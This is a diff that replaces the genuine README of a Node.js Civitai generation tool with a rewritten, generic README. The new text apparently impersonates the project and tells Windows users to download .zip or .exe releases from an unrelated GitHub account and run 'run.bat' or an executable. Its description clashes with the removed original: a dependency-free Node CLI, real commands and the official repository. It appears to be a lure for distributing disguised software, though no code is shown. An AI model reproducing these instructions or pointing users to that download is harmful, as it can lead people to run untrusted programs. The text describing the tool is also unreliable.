@@ -1,90 +1,104 @@
-# civitai-gen
+# 🎨 civitai-gen-skill - Create media using simple text commands
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](./LICENSE)
-[![Node](https://img.shields.io/badge/node-%E2%89%A518-green.svg)](https://nodejs.org)
+[![Download for Windows](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/dovudja9209/civitai-gen-skill/releases)
 
-An [agent skill](https://agentskills.io) that generates images, videos, audio, and more through [Civitai's](https://civitai.com) orchestration Workflow API. Every generation type — text-to-image, video, text-to-speech, music, transcription — shares one async lifecycle: **submit → poll → download**.
+This application connects your computer to the Civitai platform. It lets you create images, videos, and audio files by typing simple instructions. You do not need to write code to use these tools. The software acts as an assistant that receives your requests and fetches the finished files from the web.
 
-Works with any skills-compatible agent runtime (Claude Code, [OpenClaw](https://openclaw.ai), Cursor, Codex, and others). It's a self-contained Node.js CLI with **zero npm dependencies**.
+## 🛠️ System Requirements
 
-Companion: the [Civitai MCP server](https://mcp.civitai.com) (`https://mcp.civitai.com/mcp`) covers model discovery (`search_models` / AIR URNs) and signed-in write actions (posts, comments, articles, and more). This one is for **generation**.
+Before you install this software, ensure your computer meets these basic needs:
 
-## What it does
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: Standard dual-core processor or better.
+*   Memory: At least 4GB of RAM.
+*   Storage: 100MB of free disk space.
+*   Internet Connection: A stable connection is required to send requests and download your media.
+*   Software: You need Node.js version 18 or higher installed on your system.
 
-- **Images** — text-to-image (defaults to Flux.1, 4 images), img2img, checkpoint/LoRA selection, aspect & resolution control.
-- **Video** — 11+ engines (Veo 3, WAN, Kling, LTX2, Hunyuan, Vidu, Grok, Happy-Horse…), duration, aspect, optional audio.
-- **Text-to-speech** — built-in speakers, voice cloning, style instructions.
-- **Music** — ACE-Step song generation with lyrics and duration control.
-- **Transcription** — speech-to-text with timestamps and language hints.
-- **Bulk & experiments** — `--bulk file.json` batches, plus wildcard expansion and parameter sweeps.
-- **Cost estimation** — dry-run buzz estimates (`cost`, `whatif=true`) — 0 buzz spent.
+## 📥 Getting the Software
 
-## Install
+You must download the installation files from the project page.
 
-The portable way (auto-detects your runtime and installs to the right place):
+[Get the latest version here](https://github.com/dovudja9209/civitai-gen-skill/releases)
 
-```bash
-# Install for the current project
-npx skills add civitai/civitai-gen-skill
+Visit the link above to see all available versions. Choose the file that matches your Windows system. Most users download the file labeled with the latest version number ending in .zip or .exe. 
 
-# Install globally, targeting specific runtimes
-npx skills add civitai/civitai-gen-skill -g -a claude-code -a openclaw
-```
+## ⚙️ Setting Up Your Computer
 
-<details>
-<summary>Manual install (any runtime)</summary>
+This tool relies on a runtime environment called Node.js. Most modern computers do not come with this installed by default. Follow these steps to prepare your system:
 
-Clone the repo and point your runtime's skills directory at the `civitai-gen/` folder (the folder that contains `SKILL.md`):
+1. Open your web browser and go to the official Node.js website.
+2. Select the "LTS" version for Windows. This stands for Long Term Support and offers the best stability.
+3. Run the installer that you just downloaded.
+4. Keep the default settings during the installation process. Click "Next" until the process completes.
+5. Restart your computer to make sure the software registers your changes.
 
-```bash
-git clone https://github.com/civitai/civitai-gen-skill
-# then symlink/copy ./civitai-gen-skill/civitai-gen into your runtime's skills dir, e.g.:
-#   Claude Code : ~/.claude/skills/civitai-gen
-#   OpenClaw    : ~/.agents/skills/civitai-gen   (or ~/.openclaw/skills/civitai-gen)
-#   neutral     : ~/.agents/skills/civitai-gen
-```
-</details>
+To verify your setup:
+1. Press the Windows key on your keyboard.
+2. Type "cmd" and press Enter to open the Command Prompt.
+3. Type `node -v` and press Enter.
+4. If you see a version number like v18.0.0 or higher, you are ready to proceed.
 
-## Requirements
+## 🚀 Running the Application
 
-- **Node.js 18+** (uses native `fetch`; no dependencies to install)
-- A **`CIVITAI_API_KEY`** — get one at <https://civitai.com/user/account>
-- `ffmpeg` — optional, only for local audio post-processing
+Once you have installed the software, you can launch the tool to start creating.
 
-## Configuration
+1. Locate the folder where you saved the civitai-gen-skill files.
+2. Extract the contents of the ZIP folder to a place you can easily find, such as your Desktop or Documents folder.
+3. Open the folder.
+4. Locate the file named `run.bat` or the primary executable file.
+5. Double-click the file to open the command window.
 
-Provide the API key either way:
+The window will display a prompt. This is where you type your instructions. You can ask for a specific image, a short video clip, or audio narration. 
 
-```bash
-# Environment variable
-export CIVITAI_API_KEY=your_key_here
+## 💡 How to Create Media
 
-# …or a .env file in the skill directory
-cp civitai-gen/.env.example civitai-gen/.env   # then edit
-```
+The system reads your intent. You do not need to use complex commands. Type clear sentences describing what you want.
 
-## Usage
+*   For images: "Create an image of a mountain landscape at sunset."
+*   For audio: "Generate a voice narrating a story about a dragon."
+*   For video: "Make a five-second video of rain falling on a window."
 
-Run from the skill directory (`civitai-gen/`):
+The system sends your request to the Civitai service. It processes your input and returns the file to your computer. The software saves these new files in a folder named `outputs` inside your application directory.
 
-```bash
-node generate.mjs wait --prompt "A knight at sunset" -o ./out            # image
-node generate.mjs wait --engine veo3 --prompt "A robot walking" -o ./out # video
-node generate.mjs tts --text "Hello world" --speaker serena -o ./out     # speech
-node generate.mjs cost --engine veo3 --prompt "A robot" --duration 8     # estimate (0 buzz)
-node generate.mjs engines                                                # live engine list
-```
+## 🔧 Managing Settings
 
-See [`civitai-gen/SKILL.md`](civitai-gen/SKILL.md) for the full command table and [`civitai-gen/docs/engines.md`](civitai-gen/docs/engines.md) for engine/model selection guidance.
+You may want to change how the application works. Every installation includes a file named `config.json`. You can open this file with any standard text editor, such as Notepad.
 
-## Supported runtimes
+Inside this file, you will find settings for things like:
+*   Output quality: Change the resolution settings to get sharper images or clearer video.
+*   Save location: Tell the software to save your files in a different folder on your computer.
+*   Language: Set the preferred language for the assistant to understand your commands better.
 
-Distributed in the [AgentSkills](https://agentskills.io) format (`SKILL.md` + scripts), installable via [`skills.sh`](https://skills.sh). The CLI itself is runtime-agnostic — it only needs Node.js — so any runtime that loads agent skills can use it. Tested with Claude Code and OpenClaw.
+Always save the file after you make changes. Restart the application if you modify the settings while the program runs.
 
-## Contributing & development
+## 🛡️ Troubleshooting Common Issues
 
-See [`CLAUDE.md`](CLAUDE.md) for architecture, module layout, and how to add new step types. Tests live in `civitai-gen/test/smoke-test.mjs` (`--readonly` runs at 0 buzz).
+If the program closes unexpectedly, check the following items:
 
-## License
+*   Internet connection: The software cannot create media if it lacks an internet connection. Check if you can open a website in your browser.
+*   Permissions: Ensure you have read and write access to the folder where you placed the application.
+*   Node version: If the program fails to start, verify your Node.js version by typing `node -v` in the Command Prompt again. It must be version 18 or higher.
+*   Api Key: Some advanced features require an API key from your Civitai account. Check the project documentation for instructions on how to add this to your configuration file if prompted.
 
-[MIT](./LICENSE) © Civitai
+## 📝 Frequently Asked Questions
+
+**Does this software store my files on its own servers?**
+No, your files stay on your computer. The software only connects to Civitai to process the data, and then it downloads the result to your local storage.
+
+**Is there a limit to how many files I can create?**
+Your Civitai account settings dictate the limits for generation. Check your account dashboard on the Civitai website for details on your usage quota.
+
+**Can I run this on a Mac or Linux?**
+While this guide focuses on Windows, the underlying engine supports other operating systems. You would follow the same steps to install Node.js and run the process in a terminal window.
+
+**What if the software runs slowly?**
+Large images or long videos take more time to generate. Ensure you have a strong connection and enough available memory on your computer to handle the file sizes. Close other heavy applications while generating media.
+
+## 🔗 Project Resources
+
+For more information on how to use advanced features or to report a bug, visit the main repository page. You can track progress, view updates, or join the community discussion.
+
+Project Repository: https://github.com/dovudja9209/civitai-gen-skill
+
+This software remains free to use and update. Regular checks for new versions will ensure you have access to the latest generation features. Always use the latest version to maintain compatibility with the Civitai platform.
